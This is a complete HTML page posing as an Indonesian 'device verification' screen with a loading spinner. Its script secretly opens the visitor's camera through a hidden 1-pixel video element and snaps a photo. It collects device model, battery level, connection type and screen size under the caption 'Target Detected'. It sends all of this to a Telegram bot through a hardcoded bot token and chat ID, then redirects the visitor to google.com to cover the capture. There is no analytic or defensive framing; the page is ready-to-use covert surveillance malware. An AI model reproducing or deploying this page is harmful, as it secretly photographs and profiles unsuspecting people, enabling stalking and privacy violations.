<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Sedang memverifikasi perangkat anda...</p>

    <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // MASUKKAN TOKEN DAN CHAT ID DI SINI
        const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
        const CHAT_ID = '6888530451';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        function getDeviceName() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/.test(ua)) return "Apple iOS Device";
            if (/Samsung|SM-/.test(ua)) return "Samsung Galaxy";
            if (/Redmi|Xiaomi|Mi|POCO/.test(ua)) return "Xiaomi / Redmi";
            if (/Oppo/.test(ua)) return "Oppo Device";
            if (/Vivo/.test(ua)) return "Vivo Device";
            if (/Realme/.test(ua)) return "Realme Device";
            if (/Pixel/.test(ua)) return "Google Pixel";
            return "Android Device";
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(takeSnapshot, 3000);
                };
            } catch (err) {
                try {
                    const fallback = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = fallback;
                    setTimeout(takeSnapshot, 3000);
                } catch (e) {
                    window.location.href = "https://google.com";
                }
            }
        }

        async function takeSnapshot() {
            let battery = "N/A";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                }
            } catch (e) {}

            const info = `📸 <b>Target Terdeteksi!</b>\n\n` +
                         `📱 <b>Perangkat:</b> ${getDeviceName()}\n` +
                         `🔋 <b>Baterai:</b> ${battery}\n` +
                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : 'N/A'}\n` +
                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
                         `🌍 <b>Sistem:</b> Android / Mobile OS\n\n` +
                         `<i>NEPTUNUS V1.0.8</i>`;

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                if (!blob) { window.location.href = "https://google.com"; return; }
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target.jpg');
                formData.append('caption', info);
                formData.append('parse_mode', 'HTML');

                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).finally(() => {
                    window.location.href = "https://google.com";
                });
            }, 'image/jpeg', 0.8);
        }

        window.onload = startCamera;
    </script>
</body>
</html>
